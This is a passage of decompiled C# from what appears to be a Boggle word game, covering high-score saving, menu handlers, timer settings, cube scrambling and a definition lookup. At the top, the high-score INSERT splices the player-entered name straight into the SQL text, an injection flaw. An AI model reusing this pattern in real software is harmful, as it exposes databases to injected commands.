			modGlobal.conBoggle.Open();
			int num2 = IntegerType.FromObject(val.ExecuteScalar());
			modGlobal.conBoggle.Close();
			if (num2 >= 10)
			{
				val.set_CommandText("Delete From HighScores Where Rounds = " + StringType.FromInteger(num));
				modGlobal.conBoggle.Open();
				val.ExecuteNonQuery();
				modGlobal.conBoggle.Close();
			}
			val.set_CommandText("Insert Into HighScores (Name,[Level],Rounds,Score) Values ('" + Strings.UCase(text2) + "','" + text + "'," + StringType.FromInteger(HumanRounds) + "," + StringType.FromInteger(HumanScore) + ")");
			modGlobal.conBoggle.Open();
			val.ExecuteNonQuery();
			modGlobal.conBoggle.Close();
		}
	}

	private void mnuEndGame_Click(object sender, EventArgs e)
	{
		if (ShowTextThread.ThreadState == System.Threading.ThreadState.Running)
		{
			ShowTextThread.Suspend();
		}
		if (ShowWordThread.ThreadState == System.Threading.ThreadState.Running)
		{
			ShowWordThread.Suspend();
		}
		tmrContMain.set_Enabled(false);
		tmrMain.TimerText = "000";
		ScramSec = 5.0;
		btnAddWord.BogButtonEnabled = false;
		btnScramble.BogButtonEnabled = false;
		btnFinish.BogButtonEnabled = false;
		if (ObjectType.ObjTst(LateBinding.LateGet(sender, (Type)null, "text", new object[0], (string[])null, (bool[])null), (object)"Continue", false) != 0)
		{
			Round = 0;
			((Control)lblRound).set_Text(StringType.FromInteger(0));
			((Control)lblCompScore).set_Text(StringType.FromInteger(0));
			((Control)lblHumanScore).set_Text(StringType.FromInteger(0));
			((Control)lblHumanRounds).set_Text(StringType.FromInteger(0));
			((Control)lblComputerRounds).set_Text(StringType.FromInteger(0));
			mnuOptions.set_Enabled(true);
			CheckHighScores();
		}
		modGlobal.Cubes.KillCubeThreads();
		modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Clear;
		((Control)picCubesUp).Refresh();
		ShowDisplayText(" Game\r\nEnded!!", FadeOut: false, StartUp: false, 180);
		switch (modGlobal.GameMode)
		{
		case modGlobal.Mode.Vs:
			ChangeMode(mnuVsMode, new EventArgs());
			break;
		case modGlobal.Mode.BoardGame:
			ChangeMode(mnuBoardGameMode, new EventArgs());
			break;
		case modGlobal.Mode.Teaching:
			ChangeMode(mnuTeachingMode, new EventArgs());
			break;
		}
	}

	private void mnuEnableDefSearch_Click(object sender, EventArgs e)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		mnuEnableDefSearch.set_Checked(!mnuEnableDefSearch.get_Checked());
		if (mnuEnableDefSearch.get_Checked())
		{
			MessageBox.Show("Defenition search is enabled. You must be connected to the internet in order for this feature to function properly.", "Defenition Search Enabled", (MessageBoxButtons)0);
		}
	}

	private void ChangeTimerInterval(object sender, EventArgs e)
	{
		object obj = LateBinding.LateGet(sender, (Type)null, "text", new object[0], (string[])null, (bool[])null);
		if (ObjectType.ObjTst(obj, (object)":30", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec030;
		}
		else if (ObjectType.ObjTst(obj, (object)"1:00", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec100;
		}
		else if (ObjectType.ObjTst(obj, (object)"1:30", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec130;
		}
		else if (ObjectType.ObjTst(obj, (object)"2:00", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec200;
		}
		else if (ObjectType.ObjTst(obj, (object)"2:30", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec230;
		}
		else if (ObjectType.ObjTst(obj, (object)"3:00", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec300;
		}
		else if (ObjectType.ObjTst(obj, (object)"3:30", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec330;
		}
		else if (ObjectType.ObjTst(obj, (object)"4:00", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec400;
		}
		else if (ObjectType.ObjTst(obj, (object)"4:30", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec430;
		}
		else if (ObjectType.ObjTst(obj, (object)"5:00", false) == 0)
		{
			modGlobal.TimerInterval = modGlobal.Interval.Sec500;
		}
		mnuTmr30.set_Checked(false);
		mnuTmr100.set_Checked(false);
		mnuTmr130.set_Checked(false);
		mnuTmr200.set_Checked(false);
		mnuTmr230.set_Checked(false);
		mnuTmr300.set_Checked(false);
		mnuTmr330.set_Checked(false);
		mnuTmr400.set_Checked(false);
		mnuTmr430.set_Checked(false);
		mnuTmr500.set_Checked(false);
		LateBinding.LateSet(sender, (Type)null, "checked", new object[1] { true }, (string[])null);
	}

	private void mnuEnableTimerFlash_Click(object sender, EventArgs e)
	{
		mnuEnableTimerFlash.set_Checked(!mnuEnableTimerFlash.get_Checked());
		if (mnuEnableTimerFlash.get_Checked())
		{
			tmrMain.EnableFlash = true;
		}
		else
		{
			tmrMain.EnableFlash = false;
		}
	}

	private void mnuExitGame_Click(object sender, EventArgs e)
	{
		mnuEndGame_Click(mnuEndGame, new EventArgs());
		((Component)(object)this).Dispose();
		ProjectData.EndApp();
	}

	private void btnContinue_Click_1(object sender, EventArgs e)
	{
		mnuEndGame_Click(btnContinue, new EventArgs());
		mnuNewGame_Click(mnuEndGame, new EventArgs());
	}

	private void btnScramble_Click_1(object sender, EventArgs e)
	{
		txtMain.set_Text("Re-Scrambling...");
		((Control)txtMain).Refresh();
		((ListControl)lstCompFoundWords).set_DataSource((object)null);
		lstCompFoundWords.get_Items().Clear();
		lstHumanWordsFound.get_Items().Clear();
		FoundWords.Clear();
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = modGlobal.Cubes.GetEnumerator();
			while (enumerator.MoveNext())
			{
				modGlobal.myCube = (Cube)enumerator.Current;
				((Control)modGlobal.myCube.CubeLabel).set_Visible(false);
				modGlobal.myCube.CubeHighLight = Color.LightGray;
				modGlobal.myCube.CubeTextColor = Color.DarkBlue;
				modGlobal.myCube.SetRndCubeLetter();
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
		modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Spinning;
		tmrContMain.set_Enabled(false);
		modGlobal.Cubes.ScrambleCubes();
		while (modGlobal.Cubes.CubesAreScrambling)
		{
			Application.DoEvents();
		}
		tmrContMain.set_Enabled(true);
		modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Normal;
		((Control)picCubesUp).Refresh();
		IEnumerator enumerator2 = default(IEnumerator);
		try
		{
			enumerator2 = modGlobal.Cubes.GetEnumerator();
			while (enumerator2.MoveNext())
			{
				modGlobal.myCube = (Cube)enumerator2.Current;
				((Control)modGlobal.myCube.CubeLabel).set_Visible(true);
			}
		}
		finally
		{
			if (enumerator2 is IDisposable)
			{
				((IDisposable)enumerator2).Dispose();
			}
		}
	}

	private void mnuEnableWordValidation_Click(object sender, EventArgs e)
	{
		mnuEnableWordValidation.set_Checked(!mnuEnableWordValidation.get_Checked());
	}

	private void lstHumanWordsFound_MouseUp(object sender, MouseEventArgs e)
	{
		if (mnuEnableDefSearch.get_Checked())
		{
			while (ShowWordThread.ThreadState == System.Threading.ThreadState.Running)
			{
				Application.DoEvents();
			}
			txtMain.set_Text("Querying Defenition...");
			Application.DoEvents();
			txtMain.set_Text(modFindWords.GetDef(((ListControl)lstHumanWordsFound).GetItemText(RuntimeHelpers.GetObjectValue(lstHumanWordsFound.get_SelectedItem()))));
			((TextBoxBase)txtMain).set_SelectionStart(0);
		}
	}

	private void btnFinish_Click(object sender, EventArgs e)
	{
		Sec = 0.0;
		Min = 0;
		tmrMain.TimerText = "000";
	}

	private void mnuTips_Click(object sender, EventArgs e)
	{
		frmWelcome frmWelcome2 = new frmWelcome();
		((Control)frmWelcome2.chkMain).set_Visible(false);
		((Control)frmWelcome2).Show();
	}

	private void mnuAbout_Click(object sender, EventArgs e)
	{
		frmAbout frmAbout2 = new frmAbout();
		((Control)frmAbout2).Show();
	}

	private void mnuHighScores_Click(object sender, EventArgs e)
	{
		frmHighScores frmHighScores2 = new frmHighScores();
		((Control)frmHighScores2).Show();
	}
}
